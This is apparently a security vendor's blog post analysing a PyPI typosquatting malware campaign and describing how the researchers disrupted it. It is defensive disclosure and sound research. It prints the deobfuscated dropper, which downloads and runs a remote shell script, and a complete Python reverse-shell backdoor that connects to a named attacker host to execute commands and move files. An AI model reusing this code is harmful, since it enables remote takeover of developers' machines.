@@ -1,0 +1,150 @@
+
+Software supply chain attacks in the open-source ecosystem are frequent and pervasive. The cost of publishing a malicious package is low, while the payoff could be high - yielding keys to infrastructure, bank credentials, or cryptocurrency.
+Phylum ingests all packages as they are published into these open-source ecosystems and analyzes the source files (over half a billion source files this year) to determine if they exhibit any indications of maliciousness.
+Performing analysis at this scale allows us to make determinations about the behaviors of software supply chain threat actors over time. As these threat actors must work in public (given how open source works), it allows us to gain insight into their evolving tactics.
+This is an overview of how we tracked an attacker (internally dubbed Gooberworm), monitored their development in real-time, and disrupted their campaign.
+A burgeoning threat
+On November 15, 2022, Phylum's system began notifying us of malicious packages being published to PyPI. Our automation capability immediately protected our users from this threat, and we published our findings to Twitter:
+As the day went on, the list of published packages continued to grow:
+
+colurama -> colurama ⚠️ Check Package
+coloroma -> Coloroma ⚠️ Check Package
+colorarise  -> colorarise ⚠️ Check Package
+randomized -> randomized ⚠️ Check Package
+msfpath ->msfpath ⚠️ Check Package
+Buried in each of these, as one might expect, was a bunch of obfuscated Python:
+Many layers of obfuscation
+The obfuscation here is comically bad (I’m sensing a pattern here). Replacing the exec with a print statement unwraps the first layer of obfuscation.
+Here is yet another layer of a different sort of obfuscation. However, unrolling it is exactly the same. Replace the exec with a print and move on.
+In the third layer, the actor tried to be a bit trickier and compile the resulting source into Python bytecode. Replacing the last line with a print(oIoeaTEAcvpae) gets us the underlying source.
+import platform
+import subprocess
+if platform.system().startswith("Linux"):
+        try:
+            with open('/tmp/file.py', 'w') as f:
+                f.write("import os \nimport subprocess \nfrom pathlib import Path \nfrom urllib import request \n")
+                f.write("hello = os.getlogin() \n")
+                f.write("PATH = '/home/' + hello + '/.msfdb.d'\n")
+                f.write("PAT  = '/tmp/file.py'\n")
+                f.write("isExist = os.path.exists(PATH) \n")
+                f.write("if not isExist:\n")
+                f.write("        os.makedirs(PATH) \n")
+                f.write("if Path(PATH).is_file(): \n")
+                f.write("           print("") \n")
+                f.write("else: \n")
+                f.write("     remote_url = 'https://raw.githubusercontent.com/gobiwound/ab32/main/naopcEaovaeAvocpa.sh' \n")
+                f.write("     local_file = PATH+'/msfdb.sh' \n")
+                f.write("     request.urlretrieve(remote_url, local_file) \n")
+                f.write("     subprocess.call(\"bash /home/$USER/.msfdb.d/msfdb.sh\", shell=True) \n")
+                f.write("     if Path(PAT).is_file(): \n")
+                f.write("         try:\n           os.remove(PAT)\n")
+                f.write("         except:\n           print()")
+
+        except FileNotFoundError:
+            print("")
+        subprocess.call("python3 /tmp/file.py &", shell=True)
+
+else:
+    print("")
+The actor then fetches something from GitHub, saves it locally as msfdb.sh, and executes it. That, too, is heavily obfuscated, which makes it somewhat difficult to reason about. Helpfully though, the actor was kind enough to store everything in a Git repo that Phylum could access. At the time of publishing, the GitHub repo is still accessible at https://github.com/gobiwound/ab32.
+Watching the attacker work in real-time
+It was around this time that we decided to report the repo to GitHub in hopes that we would cut down another component of this actor’s attack infrastructure.
+We also witnessed the attacker updating the obfuscation for their payload in real time, continuing to hone their attack for maximum efficacy.
+By this time, Phylum had already ruined the campaign, but the attacker likely didn’t realize just how burned they were. It was time to let them know. For posterity, we cloned the existing Git repo and created a new issue in the attacker’s GitHub repository.
+The attacker panics
+The attacker continued his work for the next few hours, blissfully unaware of our newly minted issue.
+When the actor did finally notice, they did what we can only assume was the first thing that came to mind: push a commit deleting all of the files from the repo. Unfortunately for them, they appear to be completely unaware of the fact that pushing a commit removing files doesn’t also remove those files from the Git history.
+In an attempt to further hide their tracks, the actor also tried to clean up the issue we created. Phylum was one step ahead and ensured that an issue title change occurred, which prevented the attacker from completely removing all references to malware.
+We can only assume “k” is the actor's response to us after we told them to “knock off” publishing malware on PyPI. Though we don’t expect that our attacker friend has any intentions of doing so.
+Unrolling the remaining obfuscation
+The question remains, though: what does the obfuscated bash script naopcEaovaeAvocpa.sh in the Git repo do? Fortunately for us, the attacker committed the full history for this file, allowing us to get a good sense of the underlying functionality.
+The attacker has contributed a few commits updating the obfuscation methods for this file. If we go back to the earliest commit touching this file, we find a file rename: from xsession-error.sh to naopcEaovaeAvocpa.sh.
+Surely the attacker wasn’t dumb enough to commit the original file completely unobfuscated… right? Spoiler alert: they were.
+At a high level, the bash checks to see if msfpath exists on the system. If it doesn’t, the package is pip installed. It then attempts to import check from msfpath and execute it.
+msfpath contains additional obfuscation, but using the tried and true replace eval with print, we were able to get back to the original Python for check.py quickly.
+import socket
+import json
+import subprocess
+import time
+import os
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+    s.settimeout(None)
+    f.close()
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    s.send(f.read())
+def connection():
+    while True:
+        time.sleep(4)
+        try:
+            s.connect(('hellwound.bounceme.net', 6003))
+            shell()
+            s.close()
+            break
+        except:
+            connection()
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+            break
+        elif command == 'background':
+            pass
+        elif command == 'help':
+            pass
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
+        if command[:3] == 'res ':
+            reliable_send(True)
+            break
+        elif command[:6] == 'upload':
+            download_file(command[7:])
+        elif command[:8] == 'download':
+            upload_file(command[9:])
+        elif command[:7] == 'sendall':
+            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def catc():
+    try:
+      connection()
+    except KeyboardInterrupt:
+      quit()
+catc()
+The script makes a connection to hellwound.bounceme.net (a no-IP DDNS hostname). It receives data from this server and, depending on the command received, takes action on the infected machine.
+The attacker’s intentions are now clear: infect as many machines as possible by way of infected Python packages, and build an army of attacker-controlled bots.
+And what about cronjob.out that appears in the Git repo? What’s the purpose of this file in this whole scheme? We’ll be publishing a follow-up post outlining how one of our engineers busted out Ghidra to make sense of this file.
+This is not the end
+At this point, the attacker's malicious packages have been removed. We reported their GitHub repository, reported their host to no-IP and publicly shamed them. Software supply chain attack thwarted!
+
+While we successfully disrupted this campaign, rest assured this is not the last time we’ll see this threat actor. They’ll be back with updated TTPs, targeting software engineers with innocuous packages that subtly insert malware onto developer machines. The attackers are numerous and persistent; a true software Hydra - cut off the head of one attacker and two more attackers take their place.
+Thus, we as engineers, must remain vigilant - checking each piece of software that we pull into our builds in an automated fashion, to block threats at the source. 
+
+With this in mind, we’ll leave all the attackers - who I’m sure are reading this - with the following:
